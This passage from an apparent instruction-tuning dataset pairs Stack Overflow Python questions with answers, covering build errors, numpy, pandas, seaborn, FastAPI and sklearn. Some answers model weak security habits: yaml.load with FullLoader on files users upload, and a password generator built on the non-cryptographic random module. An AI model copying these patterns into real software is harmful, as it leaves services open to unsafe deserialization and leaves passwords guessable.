src\/rl_addons\/renderPM\/gt1\/gt1-parset1.c:710:1: warning: function 'print_value_deep' is not needed and will not be emitted [-Wunneeded-internal-declaration]\n    print_value_deep (Gt1PSContext *psc, Gt1Value *val, int nest)\n    ^\n    3 warnings generated.\n    clang -Wno-unused-result -Wsign-compare -Wunreachable-code -fno-common -dynamic -DNDEBUG -g -fwrapv -O3 -Wall -isysroot \/Library\/Developer\/CommandLineTools\/SDKs\/MacOSX11.0.sdk -I\/Library\/Developer\/CommandLineTools\/SDKs\/MacOSX11.0.sdk\/usr\/include -I\/Library\/Developer\/CommandLineTools\/SDKs\/MacOSX11.0.sdk\/System\/Library\/Frameworks\/Tk.framework\/Versions\/8.5\/Headers -Qunused-arguments -Qunused-arguments -DRENDERPM_FT -DLIBART_COMPILATION -DLIBART_VERSION=2.3.21 -Isrc\/rl_addons\/renderPM -Isrc\/rl_addons\/renderPM\/libart_lgpl -Isrc\/rl_addons\/renderPM\/gt1 -I\/usr\/local\/include\/freetype2 -I\/usr\/local\/include -I\/usr\/local\/opt\/openssl@1.1\/include -I\/usr\/local\/opt\/sqlite\/include -I\/Users\/zulfugar\/PycharmProjects\/AppForm\/.venv\/include -I\/usr\/local\/Cellar\/python@3.8\/3.8.6_1\/Frameworks\/Python.framework\/Versions\/3.8\/include\/python3.8 -c src\/rl_addons\/renderPM\/gt1\/gt1-dict.c -o build\/temp.macosx-11.0-x86_64-3.8\/src\/rl_addons\/renderPM\/gt1\/gt1-dict.o\n    clang -Wno-unused-result -Wsign-compare -Wunreachable-code -fno-common -dynamic -DNDEBUG -g -fwrapv -O3 -Wall -isysroot \/Library\/Developer\/CommandLineTools\/SDKs\/MacOSX11.0.sdk -I\/Library\/Developer\/CommandLineTools\/SDKs\/MacOSX11.0.sdk\/usr\/include -I\/Library\/Developer\/CommandLineTools\/SDKs\/MacOSX11.0.sdk\/System\/Library\/Frameworks\/Tk.framework\/Versions\/8.5\/Headers -Qunused-arguments -Qunused-arguments -DRENDERPM_FT -DLIBART_COMPILATION -DLIBART_VERSION=2.3.21 -Isrc\/rl_addons\/renderPM -Isrc\/rl_addons\/renderPM\/libart_lgpl -Isrc\/rl_addons\/renderPM\/gt1 -I\/usr\/local\/include\/freetype2 -I\/usr\/local\/include -I\/usr\/local\/opt\/openssl@1.1\/include -I\/usr\/local\/opt\/sqlite\/include -I\/Users\/zulfugar\/PycharmProjects\/AppForm\/.venv\/include -I\/usr\/local\/Cellar\/python@3.8\/3.8.6_1\/Frameworks\/Python.framework\/Versions\/3.8\/include\/python3.8 -c src\/rl_addons\/renderPM\/gt1\/gt1-namecontext.c -o build\/temp.macosx-11.0-x86_64-3.8\/src\/rl_addons\/renderPM\/gt1\/gt1-namecontext.o\n    src\/rl_addons\/renderPM\/gt1\/gt1-namecontext.c:100:9: error: implicitly declaring library function 'strlen' with type 'unsigned long (const char *)' [-Werror,-Wimplicit-function-declaration]\n      len = strlen (s);\n            ^\n    src\/rl_addons\/renderPM\/gt1\/gt1-namecontext.c:100:9: note: include the header &lt;string.h&gt; or explicitly provide a declaration for 'strlen'\n    src\/rl_addons\/renderPM\/gt1\/gt1-namecontext.c:102:3: error: implicitly declaring library function 'memcpy' with type 'void *(void *, const void *, unsigned long)' [-Werror,-Wimplicit-function-declaration]\n      memcpy (new, s, len);\n      ^\n    src\/rl_addons\/renderPM\/gt1\/gt1-namecontext.c:102:3: note: include the header &lt;string.h&gt; or explicitly provide a declaration for 'memcpy'\n    src\/rl_addons\/renderPM\/gt1\/gt1-namecontext.c:172:10: error: implicitly declaring library function 'strcmp' with type 'int (const char *, const char *)' [-Werror,-Wimplicit-function-declaration]\n        if (!strcmp (nc-&gt;table[i &amp; mask].name, name))\n             ^\n    src\/rl_addons\/renderPM\/gt1\/gt1-namecontext.c:172:10: note: include the header &lt;string.h&gt; or explicitly provide a declaration for 'strcmp'\n    3 errors generated.\n    error: command 'clang' failed with exit status 1\n    ----------------------------------------\nERROR: Command errored out with exit status 1: \/Users\/zulfugar\/PycharmProjects\/AppForm\/.venv\/bin\/python3 -u -c 'import sys, setuptools, tokenize; sys.argv[0] = '&quot;'&quot;'\/private\/var\/folders\/_w\/8xmqn_ys20n91w63y9lcl6nr0000gn\/T\/pip-install-_q2xgbny\/reportlab\/setup.py'&quot;'&quot;'; __file__='&quot;'&quot;'\/private\/var\/folders\/_w\/8xmqn_ys20n91w63y9lcl6nr0000gn\/T\/pip-install-_q2xgbny\/reportlab\/setup.py'&quot;'&quot;';f=getattr(tokenize, '&quot;'&quot;'open'&quot;'&quot;', open)(__file__);code=f.read().replace('&quot;'&quot;'\\r\\n'&quot;'&quot;', '&quot;'&quot;'\\n'&quot;'&quot;');f.close();exec(compile(code, __file__, '&quot;'&quot;'exec'&quot;'&quot;'))' install --record \/private\/var\/folders\/_w\/8xmqn_ys20n91w63y9lcl6nr0000gn\/T\/pip-record-08bq_70o\/install-record.txt --single-version-externally-managed --compile --install-headers \/Users\/zulfugar\/PycharmProjects\/AppForm\/.venv\/include\/site\/python3.8\/reportlab Check the logs for full command output.\n<\/code><\/pre>\n<p>I tried:<\/p>\n<p>Reinstall <code>xcode-select --install<\/code>;<\/p>\n<p>Reinstalled Python <code>brew install python@3.8<\/code>;<\/p>\n<p>Installed Xcode itself;<\/p>\n<p>None of above helped.<\/p>\n<p>What can be the issue?<\/p>","output_text":"<p>this worked for me<\/p>\n<p><code>CFLAGS=&quot;-Wno-error=implicit-function-declaration&quot; pip install reportlab<\/code><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Numpy dot product between a 3d matrix and 2d matrix<p>I have a 3d array that has shape <code>(2, 10, 3)<\/code> and a 2d array that has shape <code>(2, 3)<\/code> like this:<\/p>\n<pre><code>print(t) #2d array\n\nOutput:\n\n[[1.003   2.32    3.11   ]\n [1.214   5.32    2.13241]]\n\nprint(normal) #3d array\n\nOutput:\n\n[[[0.69908573 0.0826756  0.84485978]\n  [0.51058213 0.4052637  0.5068118 ]\n  [0.45974276 0.25819549 0.10780089]\n  [0.27484999 0.33367648 0.128262  ]\n  [0.35963389 0.77600065 0.89393939]\n  [0.46937506 0.59291623 0.06620307]\n  [0.87603987 0.44414505 0.83394174]\n  [0.83186093 0.62491876 0.38160734]\n  [0.96819897 0.80183442 0.75102768]\n  [0.54182908 0.19403844 0.07925769]]\n\n [[2.82248573 3.2341756  0.96825978]\n  [2.63398213 3.5567637  0.6302118 ]\n  [2.58314276 3.40969549 0.23120089]\n  [2.39824999 3.48517648 0.251662  ]\n  [2.48303389 3.92750065 1.01733939]\n  [2.59277506 3.74441623 0.18960307]\n  [2.99943987 3.59564505 0.95734174]\n  [2.95526093 3.77641876 0.50500734]\n  [3.09159897 3.95333442 0.87442768]\n  [2.66522908 3.34553844 0.20265769]]]\n<\/code><\/pre>\n<p>How can I get each row in the 2d array <code>t<\/code> to get the corresponding dot product in the 3d array <code>normal<\/code> such that the array I end up with a shape <code>(2, 10)<\/code> where each contains all 10 dot products between the nth row in 2d array and nth matrix in 3d array?<\/p>\n<pre><code>[0.62096458 0.62618459 0.37528887 0.5728386  1.19634398 0.79620507\n 1.997884   0.75229492 1.2236496  0.4210626 ]\n[2.96347746 3.30738892 3.50596579 4.93082295 5.33811805 4.44872493\n 7.33480393 4.19173472 4.7406248  7.83229689]\n<\/code><\/pre>","output_text":"<p>You can use <a href=\"https:\/\/numpy.org\/doc\/stable\/reference\/generated\/numpy.einsum.html\" rel=\"nofollow noreferrer\"><code>numpy.einsum<\/code><\/a> (<code>np.einsum('ijk,ik-&gt;ij', t, normal)<\/code>) to get this result:<\/p>\n<pre><code>import numpy as np\n\nnormal = np.array([\n    [1.003,2.32,3.11],\n    [1.214,5.32,2.13241]\n])\n\n\nt = np.array([\n    [ \n        [0.69908573, 0.0826756,  0.84485978],\n        [0.51058213, 0.4052637,  0.5068118 ],\n        [0.45974276, 0.25819549, 0.10780089],\n        [0.27484999, 0.33367648, 0.128262  ],\n        [0.35963389, 0.77600065, 0.89393939],\n        [0.46937506, 0.59291623, 0.06620307],\n        [0.87603987, 0.44414505, 0.83394174],\n        [0.83186093, 0.62491876, 0.38160734],\n        [0.96819897, 0.80183442, 0.75102768],\n        [0.54182908, 0.19403844, 0.07925769]\n    ],\n\n    [\n        [2.82248573, 3.2341756,  0.96825978],\n        [2.63398213, 3.5567637,  0.6302118 ],\n        [2.58314276, 3.40969549, 0.23120089],\n        [2.39824999, 3.48517648, 0.251662  ],\n        [2.48303389, 3.92750065, 1.01733939],\n        [2.59277506, 3.74441623, 0.18960307],\n        [2.99943987, 3.59564505, 0.95734174],\n        [2.95526093, 3.77641876, 0.50500734],\n        [3.09159897, 3.95333442, 0.87442768],\n        [2.66522908, 3.34553844, 0.20265769]\n    ]\n])\n\nnp.einsum('ijk,ik-&gt;ij', t, normal)\n<\/code><\/pre>\n<p>This results in<\/p>\n<pre><code>array([[ 3.52050429,  3.02851036,  1.39539629,  1.44869879,  4.9411858 ,\n         2.05224039,  4.50264332,  3.47096686,  5.16705551,  1.24011516],\n       [22.69703871, 23.46350713, 21.76853041, 21.98926093, 26.07809129,\n        23.47223475, 24.81159677, 24.75511727, 26.64957859, 21.46600189]])\n<\/code><\/pre>\n<p>Which is the same as doing the two multiplications in order:<\/p>\n<pre><code>t[0] @ normal[0] \nt[1] @ normal[1] \n<\/code><\/pre>\n<p>Gives the two:<\/p>\n<pre><code>array([3.52050429, 3.02851036, 1.39539629, 1.44869879, 4.9411858 ,\n       2.05224039, 4.50264332, 3.47096686, 5.16705551, 1.24011516])\narray([22.69703871, 23.46350713, 21.76853041, 21.98926093, 26.07809129,\n       23.47223475, 24.81159677, 24.75511727, 26.64957859, 21.46600189])\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Number of sub sequences of length K having total sum S, given 2d array<p>I wish to find <em>Number of sub sequences of length K having total sum S, given an array.<\/em><\/p>\n<p><strong>Sample Input:<\/strong><\/p>\n<pre><code>a=[1,1,1,2,2] &amp; K=2 &amp; S=2\n<\/code><\/pre>\n<p><strong>Sample Output:<\/strong><\/p>\n<pre><code>3 {because a[0],a[1]; a[1]a[2]; a[0]a[2] are only three possible for the case}\n<\/code><\/pre>\n<p>I have tried to write a <strong>recursive loop<\/strong> in <strong>Python<\/strong> for starter but it isn't giving output as expected.Please can you help me find a loophole I might be missing on.<\/p>\n<pre><code>def rec(k, sum1, arr, i=0):                                 \n    #print('k: '+str(k)+' '+'sum1: '+str(sum1))     #(1) BaseCase: \n    if(sum1==0 and k!=0):                           #    Both sum(sum1) required and \n        return 0                                    #    numbers from which sum is required(k)\n    if(k==0 and sum1 !=0):                          #    should be simultaneously zero\n        return 0                                    #    Then required subsequences are 1\n    if(k==0 and sum1==0 ):                          # \n        return 1                                    #\n    base_check = sum1!=0 or k!=0                    #(2) if iterator i reaches final element \n    if(i==len(arr) and base_check):                 #    in array we should return 0 if both k \n        return 0                                    #    and sum1 aren't zero\n                                                    #    func rec for getting sum1 from k elements \n    if(sum1&lt;arr[0]):                                #    takes either first element or rejects it\n        ans=rec(k-1,sum1,arr[i+1:len(arr)],i+1)     #    so 2 cases in else loop \n        print(ans)                                  #    i is taken in as iterator to provide array \n    else:                                           #    input to rec func from 2nd element of array \n        ans=rec(k-1, sum1-arr[0], arr[i+1:len(arr)],i+1)+rec(k, sum1, arr[i+1:len(arr)],i+1)\n        #print('i: '+str(i)+' ans: '+str(ans))      \n    return(ans)\n\na=[1,1,1,2,2]\nprint(rec(2,2,a))\n<\/code><\/pre>\n<p>I am still unable to process how to make changes. Once this normal recursive code is written I might go to <strong>DP<\/strong> approach accordinlgy.<\/p>","output_text":"<h2>Using <code>itertools.combinations<\/code><\/h2>\n<p>Function <a href=\"https:\/\/docs.python.org\/2\/library\/itertools.html#itertools.combinations\" rel=\"nofollow noreferrer\"><code>itertools.combinations<\/code><\/a> returns all the subsequences of a given lengths. Then we filter to keep only subsequences who sum up to the desired value.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import itertools\ndef countsubsum(a, k, s):\n  return sum(1 for c in itertools.combinations(a,k) if sum(c)==s)\n<\/code><\/pre>\n<h2>Fixing your code<\/h2>\n<p>Your code looks pretty good, but there are two things that appear wrong about it.<\/p>\n<p><strong>What is this <code>if<\/code> for?<\/strong><\/p>\n<p>At first I was a bit confused about <code>if(sum1&lt;arr[0]):<\/code>. I think you can (and should) always go to the else branch. After thinking about it some more, I understand you are trying to get rid of one of the two recursive calls if <code>arr[0]<\/code> is too large to be taken, which is smart, but this makes the assumption that all elements in the array are nonnegative. If the array is allowed to contain negative numbers, then you can include a large <code>a[0]<\/code> in the subsequence, and hope for a negative element to compensate. So if the array can contain negative numbers, you should get rid of this <code>if<\/code>\/<code>else<\/code> and always execute the two recursive calls from the <code>else<\/code> branch.<\/p>\n<p><strong>You are slicing wrong<\/strong><\/p>\n<p>You maintain a variable <code>i<\/code> to remember where to start in the array; but you also slice the array. Pretty soon your indices become wrong. You should use slices, or use an index <code>i<\/code>, but not both.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code># WRONG\nans=rec(k-1, sum1-arr[0], arr[i+1:len(arr)],i+1)+rec(k, sum1, arr[i+1:len(arr)],i+1)\n\n# CORRECT\nans = rec(k-1, sum1-arr[i], arr, i+1) + rec(k, sum1, arr, i+1)\n\n# CORRECT\nans = rec(k-1, sum1-arr[0], arr[1:]) + rec(k, sum1, arr[1:])\n<\/code><\/pre>\n<p>To understand why using both slicing and an index gives wrong results, run the following code:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>def iter_array_wrong(a, i=0):\n  if (a):\n    print(i, a)\n    iter_array_wrong(a[i:], i+1)\n\ndef iter_array_index(a, i=0):\n  if i &lt; len(a):\n    print(i, a)\n    iter_array_index(a, i+1)\n\ndef iter_array_slice(a):\n  if a:\n    print(a)\n    iter_array_slice(a[1:])\n\nprint('WRONG')\niter_array_wrong(list(range(10)))\nprint()\nprint('INDEX')\niter_array_index(list(range(10)))\nprint()\nprint('SLICE')\niter_array_slice(list(range(10)))\n<\/code><\/pre>\n<p>Also note that <code>a[i:len(a)]<\/code> is exactly equivalent to <code>a[i:]<\/code> and <code>a[0:j]<\/code> is equivalent to <code>a[:j]<\/code>.<\/p>\n<h2>Clean version of the recursion<\/h2>\n<p>Recursively count the subsequences who use the first element of the array, and the subsequences who don't use the first element of the array, and add the two counts. To avoid explicitly slicing the array repeatedly, which is an expensive operation, we keep a variable <code>start<\/code> to remember we are only working on subarray <code>a[start:]<\/code>.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>def countsubsum(a, k, s, start=0):\n  if k == 0:\n    return (1 if s == 0 else 0)\n  elif start == len(a):\n    return 0\n  else:\n    using_first_element = countsubsum(a, k-1, s-a[start], start+1)\n    notusing_first_elem = countsubsum(a, k, s, start+1)\n    return using_first_element + notusing_first_elem\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n CORS error when using pyyaml with FastAPI<p>I am trying to create a simple web-application using a react front end and fastapi back end. One function of the web-app is the send a file that is collected at the front end and processed on the back end. I have an endpoint on the back end that looks like:<\/p>\n\n<pre><code>@app.post(\"\/upload_file\/\")\nasync def create_upload_file(file: UploadFile = File(...)):\n    for line in file.file.readlines():\n        print(line)\n    file.file.close()\n    return {\"filename\": file.filename}\n<\/code><\/pre>\n\n<p>I have confirmed that this code works. From the front end I can send a file, watch the lines print out on my back end terminal, and the front end receives an http response with a 200 status code and the filename. <\/p>\n\n<p>The issue comes when I try to use the pyyaml library to process the inbound yaml file. Below is a code snippet which does not work:<\/p>\n\n<pre><code>@app.post(\"\/upload_file\/\")\nasync def create_upload_file(file: UploadFile = File(...)):\n    yaml_data = yaml.load(file, Loader=yaml.FullLoader)\n    return yaml_data\n<\/code><\/pre>\n\n<p>I get the error:<\/p>\n\n<pre><code>Access to XMLHttpRequest at 'http:\/\/127.0.0.1:8000\/upload_file\/' (redirected from 'http:\/\/127.0.0.1:8000\/upload_file') from origin 'http:\/\/localhost:3000' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.\n<\/code><\/pre>\n\n<p>So this seems to be a CORS issue... My current CORS policy for FastAPI looks like:<\/p>\n\n<pre><code>origins = [\n    \"http:\/\/localhost\",\n    \"http:\/\/localhost:3000\",\n    \"http:\/\/127.0.0.1:8000\",\n]\n\napp.add_middleware(\n    CORSMiddleware,\n    allow_origins=origins,\n    allow_credentials=True,\n    allow_methods=[\"*\"],\n    allow_headers=[\"*\"],\n)\n<\/code><\/pre>\n\n<p>Do I have to add something to my CORS policy to allow it to use pyyaml? I did not think that would be the case since the processing should still be done at the same endpoint (note the endpoints are at the same place), however CORS is clearly not happy about using that <code>yaml.load()<\/code> function. Any suggestions on being able to load yaml files in my back end would be much appreciated.<\/p>\n\n<p>Per request from Rishabh Batra I have added the OPTIONS headers here: <a href=\"https:\/\/i.stack.imgur.com\/YhxyP.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/YhxyP.png\" alt=\"enter image description here\"><\/a><\/p>","output_text":"<p>Solved it. Turns out for <code>starlette<\/code>, a library that <code>FastAPI<\/code> is built off, the UploadFile object is not analogous to the python file object. If you want it to behave like a python file object you have to do <code>file.file<\/code>. So for the above snippet which was failing, the correct way to do that would be like:<\/p>\n\n<pre><code>@app.post(\"\/upload_file\/\")\nasync def create_upload_file(file: UploadFile = File(...)):\n    yaml_data = yaml.load(file.file, Loader=yaml.FullLoader)\n    return yaml_data\n<\/code><\/pre>\n\n<p>CORS policy was correct, no idea why it was throwing a CORS error<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Building a password generator<p>I have recently built a password generator but wanted to include an aspect where if the user types in a letter instead of a number when defining the length of the password and number of passwords then the output would be to loop back in. If not the password generator would continue if numbers were inputted.<\/p>\n<p>This is my code so far:<\/p>\n<pre><code>import random\n\nchar = &quot;abcdefghijklmnopqrstuvwkyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789!@\u00a3$%^&amp;*&quot;\n\nwhile True:\n\n   \n        password_length = input(&quot;how long do you want your password? &quot;)\n        password_count = input(&quot;how many passwords do you want? &quot;)\n\n\n        if password_length and password_count != type(int):\n\n            print(&quot;Please can you enter a number&quot;)\n\n        elif password_length and password_count == type(int):\n\n            for x in range(0,int(password_count)):\n\n                password = &quot;&quot;\n                    \n                for y in range(0,int(password_length)):\n\n                    random_letters = random.choice(char)\n                    password += random_letters\n\n                print(password)\n<\/code><\/pre>","output_text":"<p>Python <a href=\"https:\/\/www.w3schools.com\/python\/ref_string_isdigit.asp\" rel=\"nofollow noreferrer\">offers a better way<\/a> to check if a <code>string<\/code> is a digit or not.<\/p>\n<p>From w3:<\/p>\n<blockquote>\n<p>The <code>isdigit()<\/code> method returns True if all the characters are digits, otherwise False.<\/p>\n<\/blockquote>\n<pre><code>import random\n\nchar = &quot;abcdefghijklmnopqrstuvwkyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789!@\u00a3$%^&amp;*&quot;\nwhile True:\n   password_length = input(&quot;how long do you want your password? &quot;)\n   password_count = input(&quot;how many passwords do you want? &quot;)\n\n   if password_count.isdigit() and password_length.isdigit(): \n     password_int = int(password_count)\n     password = &quot;&quot;\n     for x in range(0,password_int):\n         for y in range(0,int(password_length)):\n            random_letters = random.choice(char)\n            password += random_letters\n           \n     print(password)\n   else: \n      print(&quot;Please enter a valid input in numbers&quot;)\n<\/code><\/pre>\n<p>Output:<\/p>\n<pre><code>how long do you want your password? 8\nhow many passwords do you want? 1\n\nABZEG66j\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to merge column names and drop columns in pandas after reading to html<p>I am trying to clean up a pandas dataframe taken from a html table. I am using <code>dfs = pd.read_html(table_html)<\/code> to generate the frame. After reading the html into pandas it looks like so:<\/p>\n<pre><code>            Time                               ABC|XX3                   ABC|XX3            ABC|XX3 \n            Time Day-ahead Total Load Forecast [A.L.1] Actual Total Load [A.L.1] Unnamed: 3_level_1\n            Time                                  [MW]                      [MW] Unnamed: 3_level_2\n0  00:00 - 01:00                                 10169                         -\n1  01:00 - 02:00                                 10092                         -\n2  02:00 - 03:00                                 10091                         -\n3  03:00 - 04:00                                 10221                         -\n<\/code><\/pre>\n<p>I am trying to do two things:<\/p>\n<ol>\n<li>Merge the multiple column headers into a single column header.<\/li>\n<li>Drop any column that has &quot;Unnamed:&quot; in its column header after merging.<\/li>\n<\/ol>\n<p>Here is the code I am using to do this:<\/p>\n<pre><code>def clean_df_colnames(df):\n    # step one - merge headers\n    new_columns = df.columns.values\n    for index, colnames in enumerate(new_columns):\n        if isinstance(colnames, str):\n            continue\n        names_seen = set()\n        names = []\n        for name in colnames:\n            if name in names_seen:\n                continue\n            names_seen.add(name)\n            names.append(name)\n        name = ' '.join(names)\n        new_columns[index] = name\n    df.columns = new_columns\n    # step two - drop extras\n    cols = [c for c in df.columns if 'Unnamed:' not in c]\n    df = df[cols]\n    return df\n<\/code><\/pre>\n<p>The problem I am facing is that <code>df = df[cols]<\/code> is returning an error <code>KeyError: '[] not in index'&quot;<\/code>. I looked it up and it seems like one cause is that I didn't set the axis when reading, so I tried by changing it to <code>dfs = pd.read_html(table_html, index_col=0)<\/code> instead. While this runs without error, the first column header &quot;Time&quot; is missing from the output.<\/p>\n<pre><code>              ABC|XX3 Day-ahead Total Load Forecast [A.L.1] [MW] ABC|XX3 Actual Total Load [A.L.1] [MW]\n00:00 - 01:00                                              10169                         -\n01:00 - 02:00                                              10092                         -\n02:00 - 03:00                                              10091                         -\n03:00 - 04:00                                              10221                         -\n<\/code><\/pre>\n<p>Is there a better way for me to merge these headers while also being able to drop the indicated columns?<\/p>","output_text":"<p>My drop code was wrong. I changed to to this and it now works:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>df.drop(columns=[c for c in df.columns.values if 'Unnamed:' in c], inplace=True)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to use pandas dataframe set_index()<p>Let us create a <code>pandas dataframe<\/code> with two columns:<\/p>\n\n<pre><code>lendf = pd.read_csv('\/git\/opencv-related\/experiments\/audio_and_text_files_lens.csv',\n        names=['path','duration'])\n<\/code><\/pre>\n\n<p>Here is the default numerically incrementing <code>index<\/code>:<\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/ojFhw.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/ojFhw.png\" alt=\"enter image description here\"><\/a><\/p>\n\n<p>Let's change the <code>index<\/code> to allow searching by the <code>path<\/code> attribute:<\/p>\n\n<pre><code>lendf.set_index(['path'])\n<\/code><\/pre>\n\n<p>But the <code>index<\/code> did not change??<\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/De7hV.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/De7hV.png\" alt=\"enter image description here\"><\/a><\/p>\n\n<p>How about invoking <code>reindex()<\/code> ?<\/p>\n\n<pre><code>lendf.reindex()\n<\/code><\/pre>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/vpz7X.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/vpz7X.png\" alt=\"enter image description here\"><\/a><\/p>\n\n<p>Still no change!<\/p>\n\n<p>Note that I had been referencing the source code sphinx <a href=\"https:\/\/pandas.pydata.org\/pandas-docs\/stable\/reference\/api\/pandas.DataFrame.set_index.html\" rel=\"nofollow noreferrer\">https:\/\/pandas.pydata.org\/pandas-docs\/stable\/reference\/api\/pandas.DataFrame.set_index.html<\/a>: here is an excerpt:<\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/lB43L.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/lB43L.png\" alt=\"enter image description here\"><\/a><\/p>\n\n<p>So then what am I misunderstanding about <code>pandas<\/code> indexing - and how should the search\/indexing by <code>path<\/code> be set up?<\/p>","output_text":"<p>You need to pass <a href=\"https:\/\/pandas.pydata.org\/pandas-docs\/stable\/reference\/api\/pandas.DataFrame.set_index.html\" rel=\"nofollow noreferrer\"><code>inplace=True<\/code><\/a> otherwise <code>set_index<\/code> will return a new dataframe not alter the existing one<\/p>\n\n<pre><code>lendf.set_index(['path'], inplace=True)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Setting font sizes of a seaborn plot<p>I'm struggling with setting the font sizes of a seaborn plot correctly. Setting the font size of the title works perfectly fine but unfortunately I didn't have any success yet regarding the font sizes of the axes and the legend. This is my code (using some dummy data):<\/p>\n\n<pre><code>import matplotlib.pyplot as plt\nimport pandas as pd\nimport seaborn as sns\n\ndf = pd.DataFrame()\ndf['First PCA dimension'] = [1,2,3,4]\ndf['Second PCA dimension'] = [0,5,5,7]\ndf['Third PCA dimension'] = [1,2,6,4]\ndf['Data points'] = [1,2,3,4]\n\nplt.figure(figsize=(42,30))\nplt.title('2-D PCA of my data points',fontsize=32)\n\ncolors = [\"#FF9926\", \"#2ACD37\",\"#FF9926\", \"#FF0800\"]\nsns.scatterplot(x=\"First PCA dimension\", y=\"Second PCA dimension\", hue=\"Data points\", palette=sns.color_palette(colors), data=df, legend=\"full\", alpha=0.3)\nsns.set_context(\"paper\", rc={\"font.size\":48,\"axes.titlesize\":48,\"axes.labelsize\":48})   \nplt.savefig(outputPath+'\/PCA\/'+'PCA_2D.png',dpi=100,bbox_inches='tight')\n<\/code><\/pre>\n\n<p>, which results in the following output:<\/p>\n\n<p><a href=\"https:\/\/i.stack.imgur.com\/Lw2kL.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/Lw2kL.png\" alt=\"2-D PCA output\"><\/a><\/p>\n\n<p>Changing the numbers in the \"set_context\" function doesn't have any effect.<\/p>","output_text":"<p>BTW, the figure size is too big <code>(42x30)<\/code>:<\/p>\n\n<pre><code>import matplotlib.pyplot as plt\nimport pandas as pd\nimport seaborn as sns\n\ndf = pd.DataFrame()\ndf['First PCA dimension'] = [1,2,3,4]\ndf['Second PCA dimension'] = [0,5,5,7]\ndf['Third PCA dimension'] = [1,2,6,4]\ndf['Data points'] = [1,2,3,4]\n\nplt.figure(figsize=(42,30))\nplt.title('2-D PCA of my data points',fontsize=32)\n\ncolors = [\"#FF9926\", \"#2ACD37\",\"#FF9926\", \"#FF0800\"]\nb = sns.scatterplot(x=\"First PCA dimension\", y=\"Second PCA dimension\", hue=\"Data points\", palette=sns.color_palette(colors), data=df, legend=\"full\", alpha=0.3)\nsns.set_context(\"paper\", rc={\"font.size\":48,\"axes.titlesize\":48,\"axes.labelsize\":48})\n\nb.set_ylabel('mylabely', size=54)\nb.set_xlabel('mylabelx', size=54)\nb.set_xticklabels([1,2,3,4,5,6,7,8], fontsize = 36)\n\nlgnd = plt.legend(fontsize='22')\nfor handle in lgnd.legendHandles:\n    handle.set_sizes([26.0])\n\nplt.show()\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to correctly use clf.predict_proba?<p>My goal is to have the three most accurate predicted label.<\/p>\n<p>By using this solution<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>clf = svm.SVC(  \n                kernel='rbf',\n                C=51,\n                gamma=1,\n                probability=True\n              ).fit(X,y)\n\npredictions=[]\nwith open('model.pkl', 'rb') as f:     \n        clf = pickle.load(f)\nfor line in X:\n        output=clf.predict(X)\n          \n        \n#predictions.append(output)\ndf['prediction'] = output\n# you add the list to the dataframe, then save the datframe to new csv\n\nprint(df)        \n<\/code><\/pre>\n<p>I'm able to retrive the predicted label. However, when I add the <code>clf.predict_proba(X)<\/code> as follows<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>clf = svm.SVC(  \n                kernel='rbf',\n                C=51,\n                gamma=1,\n                probability=True\n              ).fit(X,y)\n\npredictions=[]\nwith open('model.pkl', 'rb') as f:     \n        clf = pickle.load(f)\nfor line in X:\n        output=clf.predict(X)\n        output_prob=clf.predict_proba(X)  \n        \n#predictions.append(output)\ndf['prediction'] = output\n# you add the list to the dataframe, then save the datframe to new csv\n\nprint(df)        \n\n<\/code><\/pre>\n<p>I'm having the following error:<\/p>\n<pre><code>AttributeError: predict_proba is not available when  probability=False\n<\/code><\/pre>\n<p>According to the Scikit <a href=\"https:\/\/scikit-learn.org\/stable\/modules\/generated\/sklearn.svm.SVC.html\" rel=\"nofollow noreferrer\">documentation<\/a> the probability as True should be defined explicitly as I did in<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>clf = svm.SVC(  \n                kernel='rbf',\n                C=51,\n                gamma=1,\n                probability=True\n              ).fit(X,y)\n<\/code><\/pre>\n<p>How to fix this issue?<\/p>\n<p>Thanks<\/p>","output_text":"<p>The code below overwrites your clf variable with the model loaded from pickle file which probably its probability attribute is False.<\/p>\n<pre><code>with open('model.pkl', 'rb') as f:     \n        clf = pickle.load(f)\n<\/code><\/pre>\n<p>So you are not using the SVC instance you've created at the first part of your code.<\/p>\n<p>According to <a 